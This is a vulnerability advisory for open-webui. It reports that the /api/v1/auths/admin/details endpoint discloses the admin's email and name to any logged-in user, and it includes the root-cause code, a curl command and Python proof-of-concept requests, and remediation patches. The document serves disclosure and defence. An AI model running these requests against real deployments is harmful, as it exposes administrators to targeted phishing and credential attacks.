# Admin Information Disclosure via /api/v1/auths/admin/details in open-webui

## Summary
The `/api/v1/auths/admin/details` endpoint in open-webui exposes the admin user's email address and name to any authenticated user when the `SHOW_ADMIN_DETAILS` configuration flag is enabled (default: `true`). This allows any registered user to discover the admin's identity.

## Severity
CVSS 3.1: **4.3 Medium**
Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`

## Root Cause
In `backend/open_webui/routers/auths.py` (line 904-926):

```python
@router.get('/admin/details')
async def get_admin_details(request: Request, user=Depends(get_current_user), db: Session = Depends(get_session)):
    if request.app.state.config.SHOW_ADMIN_DETAILS:  # Default: True
        admin_email = request.app.state.config.ADMIN_EMAIL
        admin_name = None

        if admin_email:
            admin = Users.get_user_by_email(admin_email, db=db)
            if admin:
                admin_name = admin.name
        else:
            admin = Users.get_first_user(db=db)  # Falls back to first user
            if admin:
                admin_email = admin.email
                admin_name = admin.name

        return {
            'name': admin_name,
            'email': admin_email,  # <-- Admin email exposed
        }
```

The only protection is `Depends(get_current_user)` — any registered user can access this. The `SHOW_ADMIN_DETAILS` flag defaults to `true`, and even when set to `false`, the endpoint still reveals that admin details exist.

## Steps to Reproduce

1. Start open-webui (default config has `SHOW_ADMIN_DETAILS=true`)
2. Register or obtain any user account
3. Request the admin details endpoint:
```bash
curl -H "Authorization: Bearer USER_TOKEN" \
  http://localhost:8080/api/v1/auths/admin/details
```
4. Response: `{"name": "Admin Name", "email": "admin@example.com"}`

## Proof of Concept
```python
import requests

# Any authenticated user can access this endpoint
r = requests.get("http://localhost:8080/api/v1/auths/admin/details",
    headers={"Authorization": "Bearer ANY_USER_TOKEN"})
print(r.json())  # {"name": "...", "email": "..."}
```

## Impact
- **Admin identity disclosure**: Any registered user discovers the admin's email and name
- **Social engineering**: Attackers with admin identity can craft targeted phishing
- **Credential stuffing**: Known admin email is a starting point for brute-force attacks
- **Multi-tenant risk**: In shared instances, users can identify the platform administrator

## Remediation
1. Require admin privileges for this endpoint:
```python
@router.get('/admin/details')
async def get_admin_details(request: Request, user=Depends(get_admin_user), db: Session = Depends(get_session)):
    # Only admins can access admin details
```
2. Change default `SHOW_ADMIN_DETAILS` to `False`:
```python
SHOW_ADMIN_DETAILS: bool = os.environ.get("SHOW_ADMIN_DETAILS", "false").lower() == "true"
```
3. Return generic response when disabled instead of revealing the endpoint's existence.

## Researcher's Note
Verified against open-webui (latest as of Mar 21, 2026). The endpoint is registered in `auths.py` with only `get_current_user` dependency — no admin check. The `SHOW_ADMIN_DETAILS` config flag is the only gate, but it defaults to `true` in most deployments. In multi-tenant or community deployments, this allows any registered user to identify the platform administrator.
